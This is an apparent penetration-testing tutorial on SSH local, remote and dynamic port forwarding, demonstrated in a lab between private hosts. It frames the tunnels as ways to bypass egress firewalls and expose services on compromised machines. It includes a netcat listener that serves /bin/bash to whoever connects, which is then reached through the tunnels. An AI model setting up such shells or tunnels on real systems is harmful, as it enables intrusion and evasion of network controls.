# SSH Tunnelling / Port Forwarding

## SSH Tunnelling / Port Forwarding

### SSH: Local Port Forwarding

If you are on the network that restricts you from establishing certain connections to the outside world, local port forwarding allows you to bypass this limitation.\
\
For example, if you have a host that you want to access, but the egress firewall won't allow it, do this:

```csharp
ssh -L 127.0.0.1:9999:REMOTE_HOST:PORT user@SSH_SERVER
```

You can now sent traffic to 127.0.0.1:9999 on your localhost and that traffic will flow through the SSH\_SERVER to REMOTE\_HOST:PORT.

Let's see with a real example.

**On machine 10.0.0.5**

```csharp
ssh -L9999:10.0.0.12:4444 root@10.0.0.12 -N -f
```

The above says: bind on a local port 9999 (on a host 10.0.0.5). Listen for any traffic coming to that port 9999 (i.e 127.0.0.1:9999 or 10.0.0.5:9999) and forward it all that to the port 4444 on host 10.0.0.12:

We can see that the 127.0.0.1:9999 is now indeed listening:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODqxLZS5JUW7x5ZoSO%2Fssh-local-bind.png?alt=media\&token=11d0b860-3df3-49c4-a803-e7e52aaa0f9a)

**On machine 10.0.0.12**

Machine 10.0.0.12 is listening on port 4444 - it is ready to give a reverse shell to whoever joins:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODq6pwu9PbrUMisi7I%2Fssh-local-port-1.png?alt=media\&token=d165908d-c269-4c70-95b0-bd9e65273a06)

**On machine 10.0.0.5**

Since the machine is listening on 127.0.0.1:9999, let's netcat it - this should give us a reverse shell from 10.0.0.12:4444:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODq8C1T3dqgbRRsNat%2Fssh-local-port-2.png?alt=media\&token=f35c9b15-26c8-4f8c-a889-67c1b4fa4a13)

The above indeed shows that we got a reverse shell from 10.0.0.12 and the local tunnel worked.

### SSH: Remote Port Forwarding

Remote port forwarding helps in situations when you have compromised a box that has a service running on a port bound to 127.0.0.1, but you want to access that service from outside. In other words, remote port forwarding exposes an obscured port (bound to localhost) so that it can be reached from outside through the SSH tunnel.

Pseudo syntax for creating remote port forwarding with ssh tunnels is:

```csharp
ssh -R 5555:LOCAL_HOST:4444 user@SSH_SERVER
```

The above suggests that any traffic sent to port 5555 on SSHSERVER will be forwarded to the port 4444 on the LOCALHOST - the host that runs the service that is only accessible from inside that host. In other words, service on port 4444 on LOCALHOST will now be exposed through the SSHSERVER's port 5555.

Let's see an example.

**On machine 10.0.0.12**

Let's create a reverse shell listener bound to 127.0.0.1 (not reachable to hosts from outside) on port 4444:

```csharp
nc -lp 4444 -s 127.0.0.1 -e /bin/bash & ss -lt
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODzyzJLk2dDpC7YJst%2Fssh-remote-hidden.png?alt=media\&token=aa659c92-e592-46bd-aaeb-8b805661e1b0)

Now, let's open a tunnel to 10.0.0.5 and create remote port forwarding by exposing the port 4444 for the host 10.0.0.5:

```csharp
ssh -R5555:localhost:4444 root@10.0.0.5 -fN
```

The above says: bind a port 5555 on 10.0.0.5 and make sure that any traffic sent to port 5555 on 10.0.0.5, gets forwarded to a service listening on localhost:4444 on to this box (10.0.0.12).

**On machine 10.0.0.5**

Indeed, we can see a port 5555 got opened up on 10.0.0.5 as part of the tunnel creation:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODyggbXb3AdRJLYGQJ%2Fssh-remote-exposed.png?alt=media\&token=4fe2381b-d4d7-43c8-8263-a73050315fbc)

Let's try sending some traffic to 127.0.0.1:5555 - this should give us a reverse shell from the 10.0.0.12:4444 - which it did:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE-Z7uIjTmHyfzz322%2F-LODzYg2k_3j4XpkPh9a%2Fssh-remote-shell.png?alt=media\&token=f4d1b460-8626-485f-a977-a87b884cf01b)

### SSH: Dynamic Port Forwarding

Pseudo syntax for creating dynamic port forwarding:

```csharp
ssh -D 127.0.0.1:9090 user@SSH_SERVER
```

The above essentially means: bind port 9090 on localhost and any traffic that gets sent to this port, please relay it to the SSH\_SERVER - I trust it to make the connections for me.

For the demo, let's check what is our current IP before the dynamic port forwarding is set up:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE7Ik_MzFl2KNxCqS5%2F-LOE8_b8qaXCq0nlC3av%2Fssh-dynamic-port-forwarding-myip1.png?alt=media\&token=327560a8-98f5-48d1-b88c-8f7c6b94555e)

Creating an ssh tunnel to 159.65.200.10 and binding port 9090 on the local machine 10.0.0.5:

```csharp
ssh -D9090 root@159.65.200.10
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE7Ik_MzFl2KNxCqS5%2F-LOE8ig1mWPKiR1BobGE%2Fssh-dynamic-port-forwarding-create-tunel.png?alt=media\&token=dfaf7534-68a4-4917-a2e6-e10a245f90a5)

Checking network connections on the localhost 10.0.0.5, we can see that the port 9090 is now listening:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE7Ik_MzFl2KNxCqS5%2F-LOE8pOOIHfpAXiLK7WV%2Fssh-dynamic-port-forwarding-port-listening.png?alt=media\&token=1def2b43-dc9c-48c3-8da9-46debe1f5feb)

This means that if we send any traffic to 127.0.0.1:9090, that traffic will be sent to the hosts on the other end of the ssh tunnel - 159.65.200.10 and then the host 159.65.200.10 will make connections to other hosts on behalf of the host 10.0.0.5. It will return any data it receives back to the originating host 10.0.0.5.

To test this, we can set our browser to use a socks5 proxy server 127.0.0.1:9090 like so:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE7Ik_MzFl2KNxCqS5%2F-LOE9IsZXGqcgDmsUqQm%2Fssh-dynamic-port-forwarding-configure-browser.png?alt=media\&token=06301c46-082e-4347-90a5-75dad5d0b3fd)

If we check what our IP is again, it is obvious that we are now indeed masquerading the internet as 159.65.200.10:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOE7Ik_MzFl2KNxCqS5%2F-LOE9S48YbvMCZ2Fyfhp%2Fssh-dynamic-port-forwarding-myip2.png?alt=media\&token=297cb39d-db6f-45ff-bb82-7f73bd487172)

{% hint style="info" %}
Dynamic port forwarding plays along nicely with ProxyChains.
{% endhint %}

### References

{% embed url="https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html" %}
